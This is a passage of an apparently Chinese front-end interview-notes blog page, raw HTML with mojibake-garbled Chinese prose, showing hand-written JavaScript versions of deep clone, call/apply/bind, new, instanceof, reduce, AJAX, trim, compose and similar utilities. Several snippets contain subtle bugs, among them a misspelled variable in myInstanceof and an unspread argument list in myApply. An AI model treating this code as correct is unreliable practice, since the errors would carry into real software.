class="keyword">new</span> <span class="built_in">RegExp</span>(target);</span><br><span class="line">  <span class="keyword">if</span> (target <span class="keyword">instanceof</span> <span class="built_in">Date</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(target);</span><br><span class="line">  <span class="keyword">if</span> (target === <span class="literal">null</span> || <span class="keyword">typeof</span> target !== <span class="string">&#x27;object&#x27;</span>) <span class="keyword">return</span> target;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> cloneTarget = <span class="built_in">Array</span>.isArray(target) ? [] : &#123;&#125;</span><br><span class="line">  <span class="comment">// åˆ©ç”¨mapè§£å†³å¾ªç¯å¼•ç”¨é—®é¢˜ weakMapå‡å°‘å†…å­˜æ¶ˆè€—</span></span><br><span class="line">  <span class="keyword">if</span> (map.has(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(target)</span><br><span class="line">  &#125;</span><br><span class="line">  map.set(target, cloneTarget)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> target) &#123;</span><br><span class="line">    cloneTarget[key] = clone(target[key],map)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cloneTarget</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€å¯¹è±¡åªæœ‰ä¸€å±‚çš„è¯å¯ä»¥ä½¿ç”¨Object.assign()å‡½æ•°</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> initalObj = <span class="built_in">Object</span>.assign(&#123;&#125;, obj);</span><br></pre></td></tr></table></figure><p>3ã€ç”¨JSON.stringifyæŠŠå¯¹è±¡è½¬æˆå­—ç¬¦ä¸²ï¼Œå†ç”¨JSON.parseæŠŠå­—ç¬¦ä¸²è½¬æˆæ–°çš„å¯¹è±¡ã€‚å±€é™æ€§ï¼š</p><ul><li>ä¼šå¿½ç•¥ <code>undefined</code></li><li>ä¼šå¿½ç•¥ <code>symbol</code></li><li>ä¸èƒ½åºåˆ—åŒ–å‡½æ•°</li><li>ä¸èƒ½è§£å†³å¾ªç¯å¼•ç”¨çš„å¯¹è±¡</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cloneObj = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str, newobj = obj.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.JSON)&#123;</span><br><span class="line">        str = <span class="built_in">JSON</span>.stringify(obj), <span class="comment">//ç³»åˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">        newobj = <span class="built_in">JSON</span>.parse(str); <span class="comment">//è¿˜åŸ</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> obj)&#123;</span><br><span class="line">            newobj[i] = <span class="keyword">typeof</span> obj[i] === <span class="string">&#x27;object&#x27;</span> ? </span><br><span class="line">            cloneObj(obj[i]) : obj[i]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4ã€å‡½æ•°åº“lodashçš„_.cloneDeepæ–¹æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj2 = _.cloneDeep(obj1);</span><br></pre></td></tr></table></figure><h2 id="æ‰‹å†™-callã€apply-åŠ-bind-å‡½æ•°"><a href="#æ‰‹å†™-callã€apply-åŠ-bind-å‡½æ•°" class="headerlink" title="æ‰‹å†™ callã€apply åŠ bind å‡½æ•°"></a>æ‰‹å†™ callã€apply åŠ bind å‡½æ•°</h2><p>call å‡½æ•°çš„å®ç°æ­¥éª¤ï¼š</p><ul><li>åˆ¤æ–­è°ƒç”¨å¯¹è±¡æ˜¯å¦ä¸ºå‡½æ•°ï¼Œå³ä½¿æˆ‘ä»¬æ˜¯å®šä¹‰åœ¨å‡½æ•°çš„åŸå‹ä¸Šçš„ï¼Œä½†æ˜¯å¯èƒ½å‡ºç°ä½¿ç”¨ call ç­‰æ–¹å¼è°ƒç”¨çš„æƒ…å†µã€‚</li><li>åˆ¤æ–­ä¼ å…¥ä¸Šä¸‹æ–‡å¯¹è±¡æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è®¾ç½®ä¸º window ã€‚</li><li>å¤„ç†ä¼ å…¥çš„å‚æ•°ï¼Œæˆªå–ç¬¬ä¸€ä¸ªå‚æ•°åçš„æ‰€æœ‰å‚æ•°ã€‚</li><li>å°†å‡½æ•°ä½œä¸ºä¸Šä¸‹æ–‡å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ã€‚</li><li>ä½¿ç”¨ä¸Šä¸‹æ–‡å¯¹è±¡æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¿å­˜è¿”å›ç»“æœã€‚</li><li>åˆ é™¤åˆšæ‰æ–°å¢çš„å±æ€§ã€‚</li><li>è¿”å›ç»“æœã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// åˆ¤æ–­è°ƒç”¨å¯¹è±¡</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// å¦‚æœæ²¡æœ‰ä¼ æˆ–ä¼ çš„å€¼ä¸ºç©ºå¯¹è±¡ context æŒ‡å‘ window</span></span><br><span class="line">  context = context || <span class="built_in">window</span></span><br><span class="line">  <span class="comment">// fn éœ€è¦æ˜¯ä¸€ä¸ªå”¯ä¸€å€¼</span></span><br><span class="line">  <span class="keyword">let</span> fn = <span class="built_in">Symbol</span>(context), result=<span class="literal">null</span></span><br><span class="line">  <span class="comment">// ç»™ context æ·»åŠ ä¸€ä¸ªæ–¹æ³• æŒ‡å‘ this (thiså°±æ˜¯è§¦å‘çš„å‡½æ•°)</span></span><br><span class="line">  context[fn] = <span class="built_in">this</span></span><br><span class="line">  <span class="comment">// å¤„ç†å‚æ•° å»é™¤ç¬¬ä¸€ä¸ªå‚æ•°this å…¶å®ƒä¼ å…¥fnå‡½æ•°</span></span><br><span class="line">  <span class="keyword">let</span> args = [...arguments].slice(<span class="number">1</span>)</span><br><span class="line">  <span class="comment">// æ‰§è¡Œ fn</span></span><br><span class="line">  result = context[fn](...args)</span><br><span class="line">  <span class="comment">// åˆ é™¤æ–¹æ³•</span></span><br><span class="line">  <span class="keyword">delete</span> context[fn] </span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>apply å‡½æ•°çš„å®ç°æ­¥éª¤ï¼š</p><ul><li>åˆ¤æ–­è°ƒç”¨å¯¹è±¡æ˜¯å¦ä¸ºå‡½æ•°ï¼Œå³ä½¿æˆ‘ä»¬æ˜¯å®šä¹‰åœ¨å‡½æ•°çš„åŸå‹ä¸Šçš„ï¼Œä½†æ˜¯å¯èƒ½å‡ºç°ä½¿ç”¨ call ç­‰æ–¹å¼è°ƒç”¨çš„æƒ…å†µã€‚</li><li>åˆ¤æ–­ä¼ å…¥ä¸Šä¸‹æ–‡å¯¹è±¡æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è®¾ç½®ä¸º window ã€‚</li><li>å°†å‡½æ•°ä½œä¸ºä¸Šä¸‹æ–‡å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ã€‚</li><li>åˆ¤æ–­å‚æ•°å€¼æ˜¯å¦ä¼ å…¥</li><li>ä½¿ç”¨ä¸Šä¸‹æ–‡å¯¹è±¡æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¿å­˜è¿”å›ç»“æœã€‚</li><li>åˆ é™¤åˆšæ‰æ–°å¢çš„å±æ€§</li><li>è¿”å›ç»“æœ</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  context = context || <span class="built_in">window</span></span><br><span class="line">  <span class="keyword">let</span> fn = <span class="built_in">Symbol</span>(context), result=<span class="literal">null</span></span><br><span class="line">  context[fn] = <span class="built_in">this</span></span><br><span class="line">  <span class="keyword">let</span> arg = [...arguments].slice(<span class="number">1</span>)</span><br><span class="line">  result = context[fn](arg)</span><br><span class="line">  <span class="keyword">delete</span> context[fn]</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bind å‡½æ•°çš„å®ç°æ­¥éª¤ï¼š</p><ul><li>åˆ¤æ–­è°ƒç”¨å¯¹è±¡æ˜¯å¦ä¸ºå‡½æ•°ï¼Œå³ä½¿æˆ‘ä»¬æ˜¯å®šä¹‰åœ¨å‡½æ•°çš„åŸå‹ä¸Šçš„ï¼Œä½†æ˜¯å¯èƒ½å‡ºç°ä½¿ç”¨ call ç­‰æ–¹å¼è°ƒç”¨çš„æƒ…å†µã€‚</li><li>ä¿å­˜å½“å‰å‡½æ•°çš„å¼•ç”¨ï¼Œè·å–å…¶ä½™ä¼ å…¥å‚æ•°å€¼ã€‚</li><li>åˆ›å»ºä¸€ä¸ªå‡½æ•°è¿”å›</li><li>å‡½æ•°å†…éƒ¨ä½¿ç”¨ apply æ¥ç»‘å®šå‡½æ•°è°ƒç”¨ï¼Œéœ€è¦åˆ¤æ–­å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦ä¼ å…¥å½“å‰å‡½æ•°çš„ this ç»™ apply è°ƒç”¨ï¼Œå…¶ä½™æƒ…å†µéƒ½ä¼ å…¥æŒ‡å®šçš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context, ...args</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// åˆ¤æ–­è°ƒç”¨å¯¹è±¡æ˜¯å¦ä¸ºå‡½æ•°</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// è¿”å›ä¸€ä¸ªå‡½æ•°</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...newArgs</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ç”±äºæ”¯æŒæŸ¯é‡ŒåŒ–å½¢å¼ä¼ å‚, newArgs ä¿å­˜ç¬¬äºŒæ¬¡å‚æ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.call(context,...args, ...newArgs)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="new-æ“ä½œç¬¦å…·ä½“å¹²äº†ä»€ä¹ˆï¼Ÿå¦‚ä½•å®ç°ï¼Ÿ"><a href="#new-æ“ä½œç¬¦å…·ä½“å¹²äº†ä»€ä¹ˆï¼Ÿå¦‚ä½•å®ç°ï¼Ÿ" class="headerlink" title="new æ“ä½œç¬¦å…·ä½“å¹²äº†ä»€ä¹ˆï¼Ÿå¦‚ä½•å®ç°ï¼Ÿ"></a>new æ“ä½œç¬¦å…·ä½“å¹²äº†ä»€ä¹ˆï¼Ÿå¦‚ä½•å®ç°ï¼Ÿ</h2><p>åœ¨è°ƒç”¨ <code>new</code> çš„è¿‡ç¨‹ä¸­ä¼šå‘ç”Ÿä»¥ä¸‹å››ä»¶äº‹æƒ…ï¼š</p><p>ï¼ˆ1ï¼‰é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡<br>ï¼ˆ2ï¼‰è®¾ç½®åŸå‹ï¼Œå°†å¯¹è±¡çš„åŸå‹è®¾ç½®ä¸ºå‡½æ•°çš„ prototype å¯¹è±¡ã€‚<br>ï¼ˆ3ï¼‰è®©å‡½æ•°çš„ this æŒ‡å‘è¿™ä¸ªå¯¹è±¡ï¼Œæ‰§è¡Œæ„é€ å‡½æ•°çš„ä»£ç ï¼ˆä¸ºè¿™ä¸ªæ–°å¯¹è±¡æ·»åŠ å±æ€§ï¼‰<br>ï¼ˆ4ï¼‰åˆ¤æ–­å‡½æ•°çš„è¿”å›å€¼ç±»å‹ï¼Œå¦‚æœæ˜¯å€¼ç±»å‹ï¼Œè¿”å›åˆ›å»ºçš„å¯¹è±¡ã€‚å¦‚æœæ˜¯å¼•ç”¨ç±»å‹ï¼Œå°±è¿”å›è¿™ä¸ªå¼•ç”¨ç±»å‹çš„å¯¹è±¡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objectFactory</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">  <span class="comment">// Constructor æ˜¯ arguments ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ , args ä¸ºå‰©ä½™å€¼ Constructor =&gt; [Function: fn]</span></span><br><span class="line">  <span class="keyword">let</span> [Constructor, ...args] = [...arguments];</span><br><span class="line">  <span class="comment">// å°† obj çš„åŸå‹æŒ‡å‘æ„é€ å‡½æ•°, è¿™æ · obj å°±å¯ä»¥è®¿é—®åˆ°æ„é€ å‡½æ•°åŸå‹ä¸­çš„å±æ€§</span></span><br><span class="line">  obj.__proto__ = Constructor.prototype;</span><br><span class="line">  <span class="comment">// ä½¿ç”¨ apply, æ”¹å˜æ„é€ å‡½æ•° this çš„æŒ‡å‘åˆ°æ–°å»ºçš„å¯¹è±¡, è¿™æ · obj å°±å¯ä»¥è®¿é—®åˆ°æ„é€ å‡½æ•°ä¸­çš„å±æ€§</span></span><br><span class="line">  <span class="keyword">let</span> result = Constructor.apply(obj, args);</span><br><span class="line">  <span class="comment">// åˆ¤æ–­å‡½æ•°çš„è¿”å›å€¼ç±»å‹, å¦‚æœæ˜¯å€¼ç±»å‹, è¿”å›åˆ›å»ºçš„å¯¹è±¡ã€‚å¦‚æœæ˜¯å¼•ç”¨ç±»å‹, å°±è¿”å›è¿™ä¸ªå¼•ç”¨ç±»å‹çš„å¯¹è±¡ã€‚</span></span><br><span class="line">  <span class="keyword">if</span> (result &amp;&amp; <span class="keyword">typeof</span> result === <span class="string">&#x27;function&#x27;</span> || <span class="keyword">typeof</span> result === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å®ç°instanceof"><a href="#å®ç°instanceof" class="headerlink" title="å®ç°instanceof"></a>å®ç°instanceof</h2><p>instanceof è¿ç®—ç¬¦ç”¨äºåˆ¤æ–­æ„é€ å‡½æ•°çš„ <code>prototype</code> å±æ€§æ˜¯å¦å‡ºç°åœ¨å¯¹è±¡çš„åŸå‹é“¾ <code>__proto__</code> ä¸­çš„ä»»ä½•ä½ç½®ã€‚å¯å‚è€ƒ<a href="https://juejin.cn/post/6844903613584654344">æµ…è°ˆ instanceof å’Œ typeof çš„å®ç°åŸç†</a>ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myInstanceof</span>(<span class="params">leftValue, rightValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> leftVaule !== <span class="string">&#x27;object&#x27;</span> || leftVaule === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">let</span> leftproto = <span class="built_in">Object</span>.getPrototypeOf(leftValue), <span class="comment">// è·å–å·¦è¾¹å¯¹è±¡çš„åŸå‹ã€‚getPrototypeOf æ–¹æ³•è¿”å›æŒ‡å®šå¯¹è±¡çš„åŸå‹ï¼Œç­‰åŒäº __proto__</span></span><br><span class="line">    prototype = rightValue.prototype; <span class="comment">// è·å–å³è¾¹æ„é€ å‡½æ•°çš„ prototype å¯¹è±¡</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">// åˆ¤æ–­æ„é€ å‡½æ•°çš„ prototype å¯¹è±¡æ˜¯å¦åœ¨å¯¹è±¡çš„åŸå‹é“¾ä¸Š</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// è‹¥ leftproto === null é€€å‡ºæŸ¥æ‰¾</span></span><br><span class="line">    <span class="keyword">if</span> (!leftproto) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (leftproto === prototype) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    leftproto = <span class="built_in">Object</span>.getPrototypeOf(leftproto);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°ã€åŸå‹ã€åŸå‹é“¾ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾ï¼š<img src="https://i.loli.net/2021/07/21/kfuqgFARIGJnPjM.jpg" alt="Snipaste_2021-07-21_11-00-06.jpg"></p><h2 id="å®ç°sleep"><a href="#å®ç°sleep" class="headerlink" title="å®ç°sleep"></a>å®ç°sleep</h2><p>æŸä¸ªæ—¶é—´åå°±å»æ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼Œä½¿ç”¨Promiseå°è£…ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">fn, time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(fn)</span><br><span class="line">    &#125;,time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">autoPlay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">await</span> sleep(fn(),<span class="number">1000</span>)</span><br><span class="line">  <span class="keyword">await</span> sleep(fn(),<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ç°æ•°ç»„reduce"><a href="#å®ç°æ•°ç»„reduce" class="headerlink" title="å®ç°æ•°ç»„reduce"></a>å®ç°æ•°ç»„reduce</h2><p>æ›´å¤šçš„å®ç°æ•°ç»„æ–¹æ³•è§<a href="https://juejin.cn/post/6846687601806557192#comment">ã€Œæ•°ç»„æ–¹æ³•ã€ä»è¯¦ç»†æ“ä½œjsæ•°ç»„åˆ°æµ…æv8ä¸­array.js</a>ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myReduce = <span class="function"><span class="keyword">function</span> (<span class="params">fn, initValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (initValue === <span class="literal">undefined</span> &amp;&amp; !<span class="built_in">this</span>.length) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;myReduce of empty array with no initial value&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// this å°±æ˜¯è°ƒç”¨ myReduce çš„æ•°ç»„</span></span><br><span class="line">  <span class="keyword">let</span> result = initValue ? initValue : <span class="built_in">this</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = initValue ? <span class="number">0</span> : <span class="number">1</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">    <span class="comment">// acc cur index src</span></span><br><span class="line">    result = fn(result, <span class="built_in">this</span>[i], i, <span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å®ç°æ•°ç»„map"><a href="#å®ç°æ•°ç»„map" class="headerlink" title="å®ç°æ•°ç»„map"></a>å®ç°æ•°ç»„map</h2><p>é€šè¿‡ <code>reduce</code> ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">const</span> mapArray = arr.map(<span class="function"><span class="params">value</span> =&gt;</span> value * <span class="number">2</span>)</span><br><span class="line"><span class="keyword">const</span> reduceArray = arr.reduce(<span class="function">(<span class="params">acc, current</span>) =&gt;</span> &#123;</span><br><span class="line">  acc.push(current * <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">return</span> acc</span><br><span class="line">&#125;, [])</span><br><span class="line"><span class="built_in">console</span>.log(mapArray, reduceArray) <span class="comment">// [2, 4, 6]</span></span><br></pre></td></tr></table></figure><h2 id="æ‰‹å†™AJAX"><a href="#æ‰‹å†™AJAX" class="headerlink" title="æ‰‹å†™AJAX"></a>æ‰‹å†™AJAX</h2><p>æœ€ç®€æ˜“ç‰ˆæœ¬</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    request.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">    request.onreadystatechange = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.status &gt;= <span class="number">200</span> &amp;&amp; request.status &lt;<span class="number">300</span> || request.status == <span class="number">304</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> string = request.responseText</span><br><span class="line">                <span class="keyword">let</span> object = <span class="built_in">JSON</span>.parse(string)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    request.send()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç”¨æ­£åˆ™å®ç°-trim"><a href="#ç”¨æ­£åˆ™å®ç°-trim" class="headerlink" title="ç”¨æ­£åˆ™å®ç° trim()"></a>ç”¨æ­£åˆ™å®ç° trim()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.trim = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ^å¼€å§‹, \sç©ºæ ¼, +ä¸€æˆ–å¤šä¸ª, |æˆ–, $ç»“æŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æˆ–è€… </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> string.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ç°Object-createæ–¹æ³•"><a href="#å®ç°Object-createæ–¹æ³•" class="headerlink" title="å®ç°Object.createæ–¹æ³•"></a>å®ç°Object.createæ–¹æ³•</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">proto</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    <span class="comment">// å°†åŸå‹æŒ‚åœ¨æ„é€ å‡½æ•°çš„prototypeä¸Š</span></span><br><span class="line">    Fn.prototype = proto;</span><br><span class="line">    Fn.prototype.constructor = Fn;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Fn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/LaBIgJHGTkNV8QO.jpg" alt="Snipaste_2021-07-21_17-18-35.jpg"></p><h2 id="å®ç°compose"><a href="#å®ç°compose" class="headerlink" title="å®ç°compose"></a>å®ç°compose</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!fn.length) <span class="keyword">return</span> <span class="function">(<span class="params">v</span>) =&gt;</span> v;</span><br><span class="line">  <span class="keyword">if</span> (fn.length === <span class="number">1</span>) <span class="keyword">return</span> fn[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> fn.reduce(</span><br><span class="line">    <span class="comment">// pre ç¬¬ä¸€ä¸ªå‡½æ•° cur ä¸‹ä¸€ä¸ªå‡½æ•°</span></span><br><span class="line">    <span class="function">(<span class="params">pre, cur</span>) =&gt;</span></span><br><span class="line">      <span class="comment">// args ä¼ å…¥çš„å‚æ•° 1-&gt;5-&gt;8-&gt;10-&gt;11</span></span><br><span class="line">      <span class="function">(<span class="params">...args</span>) =&gt;</span></span><br><span class="line">        pre(cur(...args))</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç”¨æ³•å¦‚ä¸‹:</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn3</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn4</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> a = compose(fn1, fn2, fn3, fn4);</span><br><span class="line"><span class="built_in">console</span>.log(a(<span class="number">1</span>)); <span class="comment">// 1+4+3+2+1=11</span></span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•å°†æµ®ç‚¹æ•°ç‚¹å·¦è¾¹çš„æ•°æ¯ä¸‰ä½æ·»åŠ ä¸€ä¸ªé€—å·ï¼Œå¦‚-12000000-11-è½¬åŒ–ä¸ºã€12-000-000-11ã€"><a href="#å¦‚ä½•å°†æµ®ç‚¹æ•°ç‚¹å·¦è¾¹çš„æ•°æ¯ä¸‰ä½æ·»åŠ ä¸€ä¸ªé€—å·ï¼Œå¦‚-12000000-11-è½¬åŒ–ä¸ºã€12-000-000-11ã€" class="headerlink" title="å¦‚ä½•å°†æµ®ç‚¹æ•°ç‚¹å·¦è¾¹çš„æ•°æ¯ä¸‰ä½æ·»åŠ ä¸€ä¸ªé€—å·ï¼Œå¦‚ 12000000.11 è½¬åŒ–ä¸ºã€12,000,000.11ã€?"></a>å¦‚ä½•å°†æµ®ç‚¹æ•°ç‚¹å·¦è¾¹çš„æ•°æ¯ä¸‰ä½æ·»åŠ ä¸€ä¸ªé€—å·ï¼Œå¦‚ 12000000.11 è½¬åŒ–ä¸ºã€12,000,000.11ã€?</h2><ul><li><p>replaceæ˜¯å­—ç¬¦ä¸²æ–¹æ³•ï¼Œéœ€è¦å…ˆtoString()</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> number &amp;&amp; number.toString().replace(<span class="regexp">/(?!^)(?=(\d&#123;3&#125;)+\.)/g</span>, <span class="string">&quot;,&quot;</span>); </span><br><span 